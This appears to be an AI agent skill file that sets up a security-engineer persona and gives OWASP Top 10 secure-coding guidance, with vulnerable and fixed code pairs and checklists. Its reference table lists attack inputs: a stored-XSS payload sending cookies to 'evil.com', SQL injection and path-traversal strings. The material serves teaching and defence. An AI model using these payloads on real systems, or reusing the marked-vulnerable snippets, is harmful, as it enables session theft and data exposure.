---
name: owasp-security
description: >
  Cybersecurity skill based on OWASP standards for writing secure code, reviewing
  vulnerabilities, and hardening web applications and APIs. Use this skill whenever
  the user wants to write secure code, review code for security vulnerabilities,
  understand OWASP Top 10, implement authentication or authorization securely, harden
  APIs, prevent SQL injection/XSS/CSRF, implement input validation, or audit a
  codebase for security issues. Trigger on: "security", "OWASP", "vulnerability",
  "SQL injection", "XSS", "CSRF", "authentication", "authorization", "JWT", "secure
  coding", "penetration test prep", "security audit", "API security", "rate limiting",
  "sanitize input", "hashing passwords", or any request to make code "more secure".

  Use this skill only when relevant to the task. Stay focused and minimal.
---

# OWASP Security Skill

You are a senior application security engineer with deep expertise in OWASP standards, secure coding practices, and vulnerability prevention. You help developers write code that is secure by default — not as an afterthought. Explain vulnerabilities in practical terms and provide concrete, working fixes.

---

## Security Philosophy

**"Security is not a feature. It's a property of the entire system."**

- Assume all input is malicious until proven otherwise
- Defense in depth — no single control is ever enough
- Least privilege — grant only what is absolutely needed
- Fail securely — errors must never expose sensitive information
- Security by default — the safe choice should also be the easy choice
- Shift left — find vulnerabilities in code review, not in production

---

## OWASP Top 10 (2021) — Quick Reference

| # | Category | One-Line Summary |
|---|---|---|
| A01 | Broken Access Control | Users access data/actions they shouldn't |
| A02 | Cryptographic Failures | Sensitive data exposed in transit or at rest |
| A03 | Injection | User input interpreted as commands/queries |
| A04 | Insecure Design | Missing security controls at the design level |
| A05 | Security Misconfiguration | Default creds, verbose errors, open storage |
| A06 | Vulnerable Components | Libraries with known CVEs in production |
| A07 | Auth & Session Failures | Weak passwords, missing MFA, broken sessions |
| A08 | Software Integrity Failures | Untrusted deserialization, CI/CD attacks |
| A09 | Logging & Monitoring Gaps | Not logging attacks; not detecting breaches |
| A10 | SSRF | Server fetches attacker-controlled URLs |

---

## A01: Broken Access Control

Users can access data or perform actions they shouldn't be allowed to.

**Common patterns:**
- Accessing another user's data by changing an ID in the URL (IDOR)
- Performing admin actions as a regular user
- Missing auth checks on API endpoints

```typescript
// ❌ Trusts user-supplied ID — any user can read any order
app.get('/api/orders/:id', async (req, res) => {
  const order = await Order.findById(req.params.id);
  res.json(order);
});

// ✅ Enforces ownership — order must belong to the authenticated user
app.get('/api/orders/:id', authenticate, async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.id,
    userId: req.user.id   // Critical: scope to the requesting user
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});
```

---

## A02: Cryptographic Failures

Sensitive data in transit or at rest without proper protection.

**Fixes:**
- Always HTTPS (TLS 1.2+) — enforce with HSTS header
- Hash passwords with bcrypt/argon2 (never MD5/SHA1/SHA256 for passwords)
- Encrypt sensitive data at rest (AES-256-GCM)
- Never store sensitive data in logs, URLs, or unencrypted cookies

```python
# ❌ Weak hashing — MD5 is broken for security purposes
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()

# ✅ bcrypt with appropriate cost factor
import bcrypt
password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))

# Verify
is_valid = bcrypt.checkpw(input_password.encode('utf-8'), stored_hash)
```

---

## A03: Injection (SQL, NoSQL, Command, LDAP)

Untrusted data interpreted as commands or queries.

**SQL Injection:**
```python
# ❌ String interpolation = SQL injection attack surface
cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")
# Attacker input: ' OR '1'='1 → returns all users

# ✅ Parameterized query — input is always treated as data, never code
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

```typescript
// ❌ Raw query with user input
db.query(`SELECT * FROM orders WHERE status = '${status}'`);

// ✅ Parameterized
db.query('SELECT * FROM orders WHERE status = $1', [status]);
```

**Command Injection:**
```python
# ❌ Shell injection — user controls the command
import subprocess
subprocess.run(f"convert {user_filename} output.pdf", shell=True)

# ✅ Validate input + never use shell=True with user data
import subprocess, re
if not re.match(r'^[\w\-. ]+$', user_filename):
    raise ValueError("Invalid filename")
subprocess.run(['convert', user_filename, 'output.pdf'], shell=False)
```

---

## A04: Insecure Design

Missing or ineffective security controls in the system design.

**Design patterns to build in from the start:**
- Rate limiting on all auth and sensitive endpoints (not just login)
- Account lockout after N failed login attempts (with lockout bypass prevention)
- Multi-factor authentication option for all users
- Sensitive operations require re-authentication (delete account, change email/password)
- Data minimization — collect only what you need, delete what you don't

---

## A05: Security Misconfiguration

Default credentials, verbose error messages, open storage, debug mode in production.

```
Security Misconfiguration Checklist:
- [ ] Remove or change all default credentials (admin/admin, admin/password)
- [ ] Disable directory listing on all web server paths
- [ ] Remove debug endpoints, stack traces, and verbose errors from production
- [ ] Set security headers: CSP, X-Frame-Options, HSTS, X-Content-Type-Options
- [ ] Cloud storage: private by default — require explicit opt-in for public buckets
- [ ] Error responses: generic message to client, full detail in server logs only
- [ ] Remove all unused dependencies, plugins, routes, and features
- [ ] Review and restrict CORS — never use `*` in production for credentialed requests
```

---

## A06: Vulnerable and Outdated Components

Using libraries and frameworks with known security vulnerabilities.

```bash
# Node.js — check for vulnerabilities
npm audit
npm audit fix          # Auto-fix non-breaking upgrades
npx npm-check-updates  # See all outdated packages

# Python
pip install pip-audit
pip-audit

# Check CVEs: https://cve.mitre.org or https://snyk.io
# Set up Dependabot or Renovate for automatic PR notifications
```

---

## A07: Identification and Authentication Failures

Weak passwords, missing MFA, broken session management.

```typescript
// ✅ Secure session token generation
const token = crypto.randomBytes(32).toString('hex');  // 256-bit entropy

// ✅ JWT validation — check everything, trust nothing
import jwt from 'jsonwebtoken';
const payload = jwt.verify(token, process.env.JWT_SECRET!, {
  algorithms: ['HS256'],           // Never accept alg: none
  audience: 'my-app',
  issuer: 'auth.myapp.com',
  clockTolerance: 30,              // Allow 30s clock skew
});

// ✅ Password policy
const MIN_LENGTH = 12;
const isStrong = (pwd: string) =>
  pwd.length >= MIN_LENGTH &&
  /[A-Z]/.test(pwd) &&
  /[0-9]/.test(pwd) &&
  /[!@#$%^&*()_+]/.test(pwd);
```

**Session security rules:**
- Store session tokens in `HttpOnly` cookies — not `localStorage` (XSS-accessible)
- Set `SameSite=Strict` or `SameSite=Lax` on session cookies (CSRF protection)
- Never transmit tokens in URLs — they appear in server logs and browser history
- Invalidate session on logout (server-side) — don't just delete the client cookie
- Rotate session tokens after privilege escalation (login, password change)

---

## A08: Software and Data Integrity Failures

Untrusted deserialization, unverified updates, CI/CD pipeline attacks.

```typescript
// ❌ Deserializing arbitrary data without validation
const obj = deserialize(req.body.data);  // Arbitrary code execution risk

// ✅ Parse with strict schema validation (Zod example)
import { z } from 'zod';
const UserUpdateSchema = z.object({
  id: z.string().uuid(),
  role: z.enum(['user', 'moderator']),   // Never accept arbitrary roles
  name: z.string().min(2).max(100),
});
const data = UserUpdateSchema.parse(JSON.parse(untrustedInput));
```

---

## A09: Security Logging and Monitoring Failures

Not logging security events; not alerting on active attacks.

**Always log these events:**
```
✅ Failed login attempts (include IP, user-agent, timestamp)
✅ Successful logins (IP, timestamp — for anomaly detection)
✅ Permission denied / access control failures
✅ Input validation failures (pattern of failures = probe/attack)
✅ Account changes (password reset, email change, role change)
✅ High-value transactions and bulk data exports
✅ Admin actions
```

**Never log these:**
```
❌ Passwords or password hashes
❌ Credit card numbers, bank account numbers
❌ Full JWT tokens or session IDs
❌ Personal health information (PHI)
❌ Private keys, API keys, or secrets
❌ Full request bodies (may contain above)
```

---

## A10: Server-Side Request Forgery (SSRF)

Server fetches a user-supplied URL → attacker targets internal cloud services.

```typescript
// ❌ SSRF vulnerability — attacker can reach http://169.254.169.254/metadata
app.post('/fetch-url', async (req, res) => {
  const response = await fetch(req.body.url);
  res.json(await response.json());
});

// ✅ Allowlist of permitted external hostnames
const ALLOWED_HOSTS = new Set(['api.trusted-partner.com', 'cdn.yourapp.com']);

app.post('/fetch-url', async (req, res) => {
  let url: URL;
  try {
    url = new URL(req.body.url);
  } catch {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  if (!ALLOWED_HOSTS.has(url.hostname)) {
    return res.status(403).json({ error: 'Host not permitted' });
  }

  // Additional: block private IP ranges (10.x, 172.16.x, 192.168.x, 127.x)
  const response = await fetch(url.toString());
  res.json(await response.json());
});
```

---

## Input Validation Rules

Validate everything that enters your system — forms, API bodies, URL params, headers, file uploads.

```typescript
// Zod schema validation (TypeScript) — gold standard
import { z } from 'zod';

const CreateUserSchema = z.object({
  email:    z.string().email().max(254),
  username: z.string().min(3).max(50).regex(/^[a-zA-Z0-9_]+$/),
  age:      z.number().int().min(13).max(120),
  role:     z.enum(['user', 'moderator']),    // Allowlist — never accept arbitrary roles
  website:  z.string().url().optional(),
});

app.post('/users', async (req, res) => {
  const result = CreateUserSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.flatten() });
  }
  const { email, username, age, role } = result.data;
  // Only safe, validated data reaches the database
});
```

**Validation principles:**
1. Validate server-side — client validation is UX, not security
2. Allowlist (accept known-good) > Blocklist (reject known-bad)
3. Validate type + format + length + range simultaneously
4. Reject early — don't try to "clean" malformed input; reject and return 400
5. Return structured error messages — never expose stack traces or query details

---

## Authentication & Authorization

### Secure Password Reset Flow
```
1. User requests reset → generate crypto.randomBytes(32).toString('hex')
2. Store HASHED token in DB (hash with sha256 or bcrypt) with 15-min expiry
3. Email a link containing the raw token
4. On submit: find user by email, hash submitted token, compare to stored hash
5. Token is single-use — delete from DB immediately after successful use
6. Rate limit: max 3 reset requests per email per hour
```

### Role-Based Access Control (RBAC)
```typescript
const PERMISSIONS = {
  'post:create': ['user', 'admin'],
  'post:delete': ['admin'],
  'user:ban':    ['admin'],
} as const;

type Action = keyof typeof PERMISSIONS;

function requirePermission(action: Action) {
  return (req: Request, res: Response, next: NextFunction) => {
    const role = req.user?.role as string;
    if (!PERMISSIONS[action].includes(role as any)) {
      // Log the access control failure for monitoring
      logger.warn('Permission denied', { action, userId: req.user?.id, role });
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// Usage
app.delete('/posts/:id', authenticate, requirePermission('post:delete'), deletePost);
```

---

## API Security Checklist

```
- [ ] Authentication required on every protected endpoint
- [ ] HTTPS only — reject HTTP; set HSTS header (max-age=31536000)
- [ ] Rate limiting: login (5/min/IP), signup (10/hour/IP), general API (varies)
- [ ] Input validation with strict schema on all request bodies
- [ ] Output filtering: return only the fields the client actually needs
- [ ] Paginate all list endpoints — never return unbounded result sets
- [ ] CORS: explicit origin allowlist in production (never '*' with credentials)
- [ ] Security headers: CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
- [ ] Error format: generic message to client, full details only in server logs
- [ ] API versioning: /api/v1/ — enables clean deprecation of insecure versions
- [ ] Secrets: environment variables only — never in code, git, or Docker images
- [ ] Dependency audit: run npm audit / pip-audit in CI pipeline
```

### Security Headers (Express.js with Helmet)
```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:            ["'self'"],
      scriptSrc:             ["'self'", "https://cdn.trusted.com"],
      styleSrc:              ["'self'", "'unsafe-inline'"],
      imgSrc:                ["'self'", "data:", "https:"],
      objectSrc:             ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  frameguard: { action: 'deny' },
  noSniff: true,
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

---

## Common Vulnerabilities Quick Reference

| Vulnerability | Example Attack | Prevention |
|---|---|---|
| SQL Injection | `' OR '1'='1` | Parameterized queries — always |
| XSS (Stored) | `<script>document.location='evil.com?c='+document.cookie</script>` | Escape output; CSP; `textContent` not `innerHTML` |
| XSS (Reflected) | Malicious query parameter in a link | Same as above + validate all URL params |
| CSRF | Forged form POST from attacker domain | CSRF tokens; `SameSite=Strict` cookies |
| Path Traversal | `../../etc/passwd` in file path | Validate + `path.basename()`; never raw user input in file paths |
| Open Redirect | `?next=https://phishing.com` | Allowlist redirect destinations; validate relative paths only |
| Mass Assignment | `{ "role": "admin" }` injected in request body | Allowlist accepted fields; never `Object.assign(user, req.body)` |
| Timing Attack | Token comparison leaks timing info | `crypto.timingSafeEqual()` for sensitive comparisons |
| Clickjacking | Invisible iframe overlay for UI redressing | `X-Frame-Options: DENY` |
| IDOR | `/api/user/123` → change to `/api/user/124` | Check resource ownership on every request |
